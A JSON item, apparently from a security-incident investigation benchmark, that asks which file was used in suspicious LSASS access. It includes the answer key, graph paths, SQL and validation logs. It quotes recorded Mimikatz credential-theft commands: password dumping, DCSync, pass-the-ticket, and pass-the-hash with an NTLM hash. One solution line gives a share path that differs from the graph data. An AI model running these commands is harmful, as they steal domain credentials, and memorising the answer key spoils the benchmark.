@@ -1,0 +1,783 @@
+{
+  "id": "incident_39_train_018",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_39_qa_incident_o1-ga_c42.json",
+  "index": 18,
+  "sha256": "51898e3bff27d9ff8efd0c5a129f65cf6eafc3ba35e09b27c5013e938f76b79b",
+  "split": "train",
+  "question_record": {
+    "context": "As part of a security incident on 2024-07-04, the Mimikatz credential theft tool was detected on a device. Mimikatz is known for harvesting plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. This detection shows an attempt to use `mimikatz.exe` for credential theft. The following command lines were observed: `4748__2024-06-27t14:33:38.0249949z__mimikatz.exe lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp exit` and `5176__2024-06-27t14:33:32.4282796z__mimikatz.exe privilege::debug kerberos::ptt c:\\m365dattack\\admin-tickets exit`. The aim of this attack could be to harvest credentials to log into this or other devices within the network.",
+    "question": "During this incident, there was also suspicious access to the LSASS service. Can you identify the name of the file used for this access?",
+    "answer": "get-krbticket.ps1",
+    "solution": [
+      "The Mimikatz hacktool was detected executing with Process ID `6880` at `2024-06-27t14:32:37.7041174z`, using the command line `mimikatz.exe privilege::debug sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\"powershell.exe dir \\vnevado-win10b\rideshare\"`.",
+      "There was suspicious access to the LSASS service involving the file `get-krbticket.ps1`."
+    ],
+    "start_alert": 108,
+    "end_alert": 102,
+    "start_entities": [
+      30,
+      64,
+      71
+    ],
+    "end_entities": [
+      38
+    ],
+    "shortest_alert_path": [
+      108,
+      68,
+      102
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_39.graphml",
+  "graph_sha256": "018dbb36a3bc8e4e9df16f3337868296c9796087303c2321abc4a2eda2b79d41",
+  "path": [
+    "108",
+    "68",
+    "102"
+  ],
+  "nodes": {
+    "30": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+    },
+    "64": {
+      "type": "entity",
+      "node_type": "file",
+      "identifier_fields": "Name",
+      "value": "mimikatz.exe"
+    },
+    "71": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+    },
+    "108": {
+      "type": "alert",
+      "name": "Mimikatz credential theft tool",
+      "description": "The Mimikatz hacktool was detected on this device. Mimikatz is a credential theft tool that can harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets.  An attacker might be trying to harvest credentials to log into this or other devices on the network, by impersonating a valid user.\n\nFor more information, read the Mimikatz tool profile Threat Analytics report: https://security.microsoft.com/threatanalytics3/51db19ab-081f-46f3-9fe1-3f5e5d2f8ee0/analystreport? and read the Actor profile: Storm-0875 Threat Analytics report https://security.microsoft.com/threatanalytics3/4f60801d-912e-4bcb-91b2-f46879c8a718/analystreport\n"
+    },
+    "68": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit"
+    },
+    "102": {
+      "type": "alert",
+      "name": "Suspicious access to LSASS service",
+      "description": "In order to obtain clear-text password, attackers must decrypt the user's password from the LSASS service's memory. Multiple public tools as well as custom ones could be used to perform this operation. Once obtained, these credentials are often used in lateral movement activities to infiltrate other machines and servers in the network."
+    },
+    "38": {
+      "type": "entity",
+      "node_type": "file",
+      "identifier_fields": "Name",
+      "value": "get-krbticket.ps1"
+    }
+  },
+  "interpretation": {
+    "alerts": 2,
+    "sql_steps_per_variant": 2,
+    "start_alternatives": [
+      {
+        "node": "30",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "64",
+        "concept": "File_Name",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "71",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      }
+    ],
+    "target_concept": "File_Name",
+    "weak_links": [],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_e97b693cdcbe672e",
+  "merged_ems": [
+    "em_a5657604896b51cf",
+    "em_92e340d9541367d7",
+    "em_e70aeae96c2b61b0"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 6,
+          "expected_node": "68",
+          "expected_present": true,
+          "values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              },
+              "entity_index": 4,
+              "entity_ref": "6",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+              "raw_components": {
+                "ProcessId": "5196",
+                "CreatedTimeUtc": "2024-06-27T14:32:35.4061023Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 10,
+              "entity_ref": "12",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "4112",
+                "CreatedTimeUtc": "2024-06-27T14:32:36.6706405Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+              "raw_components": {
+                "ProcessId": "5176",
+                "CreatedTimeUtc": "2024-06-27T14:33:32.4282796Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"kerberos::ptt C:\\M365DAttack\\Admin-Tickets\" exit"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 14,
+              "entity_ref": "16",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait",
+              "raw_components": {
+                "ProcessId": "7092",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.4998999Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 15,
+              "entity_ref": "17",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "38",
+          "expected_present": true,
+          "values": [
+            "get-krbticket.ps1"
+          ],
+          "evidence": [
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "entity_index": 21,
+              "entity_ref": "23",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 6,
+          "expected_node": "68",
+          "expected_present": true,
+          "values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+              "raw_components": {
+                "ProcessId": "4748",
+                "CreatedTimeUtc": "2024-06-27T14:33:38.0249949Z",
+                "CommandLine": "\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit"
+              },
+              "entity_index": 4,
+              "entity_ref": "6",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+              "raw_components": {
+                "ProcessId": "5196",
+                "CreatedTimeUtc": "2024-06-27T14:32:35.4061023Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit"
+              },
+              "entity_index": 10,
+              "entity_ref": "12",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "4112",
+                "CreatedTimeUtc": "2024-06-27T14:32:36.6706405Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 11,
+              "entity_ref": "13",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+              "raw_components": {
+                "ProcessId": "5176",
+                "CreatedTimeUtc": "2024-06-27T14:33:32.4282796Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"kerberos::ptt C:\\M365DAttack\\Admin-Tickets\" exit"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit"
+              },
+              "entity_index": 14,
+              "entity_ref": "16",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait",
+              "raw_components": {
+                "ProcessId": "7092",
+                "CreatedTimeUtc": "2024-06-27T14:32:46.4998999Z",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe C:\\M365DAttack\\Get-KRBTicket.ps1\\\"\" exit -Wait"
+              },
+              "entity_index": 15,
+              "entity_ref": "17",
+              "roles": [],
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-04 22:35:04.055507+00:00",
+              "matched_inputs": [
+                "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+                "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "38",
+          "expected_present": true,
+          "values": [
+            "get-krbticket.ps1"
+          ],
+          "evidence": [
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "entity_index": 21,
+              "entity_ref": "23",
+              "roles": [],
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-04 22:35:03.532131+00:00",
+              "matched_inputs": [
+                "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+                "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+                "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+                "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_db96e339d4c1b39d",
+      "seed_concept": "File_Name",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_92e340d9541367d7",
+          "status": "ok",
+          "candidate_count": 162,
+          "unique_values": [
+            "4112__2024-06-27t14:32:36.6706405z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "4748__2024-06-27t14:33:38.0249949z__\"mimikatz.exe\" \"lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp\" exit",
+            "5176__2024-06-27t14:33:32.4282796z__\"mimikatz.exe\" privilege::debug \"kerberos::ptt c:\\m365dattack\\admin-tickets\" exit",
+            "5196__2024-06-27t14:32:35.4061023z__\"mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit",
+            "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+            "7092__2024-06-27t14:32:46.4998999z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe c:\\m365dattack\\get-krbticket.ps1\\\"\" exit -wait"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+          "witnesses": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-21 22:40:00.985266+00:00",
+              "source_row_hash": "0abbf8ee8916ec4a03e3e866508d6f15635a587e0376ae368a66789a3fabda22",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-23 22:34:45.720003+00:00",
+              "source_row_hash": "18697c72083e6898762e956714003ba7ae6d10125f42c5f5bcd4b38e47715101",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "6880__2024-06-27t14:32:37.7041174z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\c$\\\"\" exit",
+              "raw_components": {
+                "ProcessId": "6880",
+                "CommandLine": "\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\\\"powershell.exe dir \\\\vnevado-win10b\\C$\\\"\" exit",
+                "CreatedTimeUtc": "2024-06-27T14:32:37.7041174Z"
+              },
+              "roles": [],
+              "entity_index": 14,
+              "alert_id": "84b87469-5fb2-0d4a-fc55-f10f8bc78d9f",
+              "time": "2024-07-25 22:35:08.183057+00:00",
+              "source_row_hash": "18975f7e28028c0bebb1ade1ec7bdb36681f5999e0f28c761894f534624cadd9",
+              "matched_inputs": [
+                "mimikatz.exe"
+              ]
+            }
+          ],
+          "witness_count": 27,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'File_Name' AND o.Concept = 'Process_Identity'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Mimikatz credential theft tool",
+            "mimikatz.exe"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_e70aeae96c2b61b0",
+          "status": "ok",
+          "candidate_count": 108,
+          "unique_values": [
+            "get-krbticket.ps1"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+          "witnesses": [
+            {
+              "concept": "File_Name",
+              "graph_value": "get-krbticket.ps1",
+              "raw_components": {
+                "Name": "Get-KRBTicket.ps1"
+              },
+              "roles": [],
+              "entity_index": 21,
+              "alert_id": "52af3fc8-859f-3d1c-5435-312924f1dc16",
+              "time": "2024-07-15 22:39:22.394304+00:00",
+              "source_row_hash": "02ea8cb1e706b48e229d65e876b89a048d5c57a69f6e0af1bb058e706a422ebc",
+              "matched_inputs": [
